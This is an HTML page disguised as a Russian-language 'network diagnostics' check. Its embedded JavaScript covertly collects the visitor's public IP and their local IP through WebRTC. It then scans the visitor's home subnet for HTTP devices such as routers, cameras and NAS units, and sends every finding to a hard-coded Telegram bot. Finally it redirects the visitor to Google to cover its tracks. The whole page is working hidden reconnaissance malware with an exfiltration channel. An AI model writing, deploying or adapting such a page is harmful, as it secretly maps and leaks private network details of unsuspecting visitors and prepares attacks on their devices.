<!DOCTYPE html>
<html>
<head><title>Проверка подключения…</title></head>
<body>
    <h3>Выполняется диагностика сети…</h3>
    <script>
        const BOT_TOKEN = '8936104890:AAFTtwKdd_JNhlcqENJ6kWonr9Wb2Z5fJ_8';    // ← свой токен
        const CHAT_ID = '8484695858';    // ← свой chat id

        const PORTS = [80, 8080, 8000, 8888];  // только HTTP (роутеры, камеры, nas)
        const SCAN_TIMEOUT = 2000;   // общий дедлайн на всё сканирование, мс

        function sendMsg(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
        }

        async function getPublicIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip;
            } catch(e) { return 'не определён'; }
        }

        function getLocalIP() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.address;
                        if (/^(192\.168\.|10\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) {
                            resolve(ip);
                            pc.close();
                        }
                    }
                };
                setTimeout(() => reject(new Error('no local ip')), 2000);
            });
        }

        // Проверка одного порта у одного IP (fetch с no-cors)
        function probeHostPort(ip, port) {
            return new Promise((resolve) => {
                const controller = new AbortController();
                const timer = setTimeout(() => controller.abort(), 800);  // индивидуальный таймаут 800 мс
                fetch(`http://${ip}:${port}/`, { mode: 'no-cors', signal: controller.signal })
                    .then(() => {
                        clearTimeout(timer);
                        resolve({ ip, port, ok: true });
                    })
                    .catch(() => {
                        clearTimeout(timer);
                        resolve({ ip, port, ok: false });
                    });
            });
        }

        (async () => {
            // 1. Публичный IP сразу
            const pubIP = await getPublicIP();
            sendMsg(`🔵 Публичный IP: ${pubIP}`);

            // 2. Локальный IP
            let localIP = null;
            try { localIP = await getLocalIP(); } catch(e) {}
            if (!localIP) {
                sendMsg(`🟡 Локальный IP не определён, глубже не сканирую.`);
                setTimeout(() => window.location = 'https://www.google.com', 200);
                return;
            }

            sendMsg(`🟢 Локальный IP: ${localIP} – быстрое сканирование подсети…`);

            const parts = localIP.split('.');
            const base = parts.slice(0,3).join('.');

            // Создаём все запросы: 254 IP * количество портов
            const allProbes = [];
            for (let i = 1; i <= 254; i++) {
                const ip = `${base}.${i}`;
                for (const port of PORTS) {
                    allProbes.push(probeHostPort(ip, port));
                }
            }

            // Запускаем параллельно, но с общим дедлайном
            const globalDeadline = new Promise((resolve) => setTimeout(resolve, SCAN_TIMEOUT, 'deadline'));
            const resultsPromise = Promise.all(allProbes);
            const winner = await Promise.race([resultsPromise, globalDeadline]);

            let alive = [];
            if (winner !== 'deadline') {
                // все завершились вовремя
                const results = await resultsPromise;
                alive = results.filter(r => r.ok).map(r => `${r.ip}:${r.port}`);
            } else {
                // вышли по дедлайну, собираем что успели (не все ответы получены)
                // ждём ещё 100 мс и смотрим
                const partial = await Promise.all(allProbes.map(p => p.then(r => r).catch(() => ({ok:false}))));
                alive = partial.filter(r => r.ok).map(r => `${r.ip}:${r.port}`);
            }

            if (alive.length) {
                // Отправляем списком, не больше 50 хостов (чтобы влезло в сообщение)
                const chunkSize = 40;
                for (let i = 0; i < alive.length; i += chunkSize) {
                    const chunk = alive.slice(i, i+chunkSize).join('\n');
                    sendMsg(chunk);
                }
            } else {
                sendMsg('Активных устройств не обнаружено');
            }

            // Мгновенный уход
            setTimeout(() => { window.location = 'https://www.google.com'; }, 150);
        })();
    </script>
</body>
</html>
